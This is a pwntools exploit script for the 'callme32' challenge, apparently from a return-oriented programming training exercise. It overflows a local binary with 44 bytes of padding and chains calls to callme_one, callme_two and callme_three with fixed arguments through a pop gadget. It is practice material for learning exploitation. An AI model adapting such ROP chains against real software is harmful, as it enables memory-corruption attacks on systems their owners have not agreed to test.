from pwn import *

p = ELF('./callme32')
r = process('./callme32')
call1 = p.plt['callme_one']
call2 = p.plt['callme_two']
call3 = p.plt['callme_three']
pop3 = 0x080487f9
log.info('call1 0x%x' %call1)
log.info('call2 0x%x' %call2)
log.info('call3 0x%x' %call3)
junk = b'X'*44
payload = junk
payload += p32(call1)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call2)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
payload += p32(call3)
payload += p32(pop3)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0xd00df00d)
r.sendline(payload)
r.interactive()